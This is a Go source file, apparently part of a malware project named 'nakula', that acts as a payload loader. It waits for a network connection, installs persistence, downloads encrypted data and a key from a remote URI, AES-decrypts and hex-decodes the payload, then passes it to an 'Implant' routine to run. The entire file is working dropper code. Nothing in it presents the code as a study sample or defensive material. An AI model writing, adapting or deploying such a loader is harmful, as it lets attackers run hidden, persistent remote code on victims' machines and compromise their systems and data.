package init

import (
	b64 "encoding/base64"
	"encoding/hex"
	aes "nakula/aes-dec"
	run "nakula/exec-syscall"
	inCon "nakula/inet"
	"os"
	"time"
)

func CheckCon(URI string) {
	isConnect := true
	for isConnect {
		err := inCon.CheckCon()
		if err != nil {
			isConnect = true
			time.Sleep(5 * time.Second)
		} else {
			isConnect = false
			time.Sleep(10 * time.Second)
			SysExec(URI)
		}
	}
}

type Json struct {
	Data string `json:"data"`
	Pass string `json:"pass"`
}

func SysExec(URI string) {
	run.Persistence()
	isData := new(Json)
	inCon.GetData(URI, isData)
	pass := isData.Pass
	data := isData.Data
	key := []byte(pass)
	sDec, _ := b64.StdEncoding.DecodeString(data)
	fileDec := []byte(sDec)
	result, err := aes.Decrypt(key, fileDec)
	if err != nil {
		time.Sleep(10 * time.Second)
		os.Exit(1)
	}

	deAes := string(result)
	cdata, err := hex.DecodeString(deAes)
	if err != nil {
		time.Sleep(10 * time.Second)
		os.Exit(1)
	}
	run.Implant(cdata)

}
